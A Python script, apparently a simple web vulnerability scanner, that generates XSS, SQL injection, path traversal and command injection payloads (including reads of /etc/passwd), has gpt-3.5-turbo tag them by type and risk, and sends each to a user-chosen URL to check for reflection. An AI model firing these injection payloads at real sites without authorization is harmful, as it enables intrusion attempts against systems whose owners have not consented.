import random, os, openai, requests, csv, json
from datetime import datetime

# Step 1: Generate Payloads
def generate_payloads():
    def xss(): return [f"<script>alert({i})</script>" for i in range(1, 201)]
    def sqli(): return [f"' OR {i}={i} --" for i in range(1, 201)]
    def lfi(): return [f"../../{'../'*i}etc/passwd" for i in range(1, 201)]
    def rce(): return [f"; cat /etc/passwd #{i}" for i in range(1, 201)]

    payloads = xss() + sqli() + lfi() + rce()
    random.shuffle(payloads)

    with open("payloads.txt", "w") as f:
        for p in payloads:
            f.write(p + "\n")

    print(f"[✓] Generated {len(payloads)} payloads.")

# Step 2: GPT Tagging + Scoring
def tag_payloads(api_key):
    openai.api_key = api_key
    with open("payloads.txt") as f: payloads = f.read().splitlines()

    results = []

    print(f"[•] Tagging all payloads using GPT...")
    for p in payloads:
        try:
            res = openai.ChatCompletion.create(
                model="gpt-3.5-turbo",
                messages=[
                    {"role": "system", "content": "Tag this payload as XSS, SQLi, LFI, RCE, or Unknown. Also rate its risk level as High, Medium, Low."},
                    {"role": "user", "content": f"Payload: {p}"}
                ]
            )
            content = res['choices'][0]['message']['content']
        except Exception as e:
            content = f"ERROR: {e}"

        results.append({
            "payload": p,
            "gpt_tag": content,
            "timestamp": datetime.now().isoformat()
        })

    with open("payloads_tagged.json", "w") as f:
        json.dump(results, f, indent=2)

    with open("payloads_tagged.csv", "w", newline='') as csvfile:
        fieldnames = ["payload", "gpt_tag", "timestamp"]
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(results)

    print(f"[✓] Tagged payloads saved to payloads_tagged.json and .csv")

# Step 3: Test Payloads Against a Target
def test_payloads(url):
    with open("payloads.txt") as f: payloads = f.read().splitlines()
    results = []

    print(f"[•] Testing payloads against: {url}")
    for p in payloads:  # Test all payloads
        try:
            r = requests.get(url, params={"input": p}, timeout=10)
            is_reflected = p in r.text
            results.append({
                "payload": p,
                "reflected": is_reflected
            })
        except Exception as e:
            results.append({
                "payload": p,
                "reflected": False,
                "error": str(e)
            })

    with open("results.json", "w") as f:
        json.dump(results, f, indent=2)

    with open("results.csv", "w", newline='') as f:
        writer = csv.DictWriter(f, fieldnames=["payload", "reflected", "error"])
        writer.writeheader()
        for r in results:
            if "error" not in r: r["error"] = ""
            writer.writerow(r)

    print(f"[✓] Testing results saved to results.json and .csv")

# Step 4: Orchestrator
def main():
    print("=== Agentic AI Security Scanner ===")
    generate_payloads()

    api_key = input("Enter your OpenAI API key: ")
    tag_payloads(api_key)

    url = input("Enter target website URL (e.g. http://demo.testfire.net): ")
    test_payloads(url)

    print("=== Done! All outputs saved. ===")

if __name__ == "__main__":
    main()
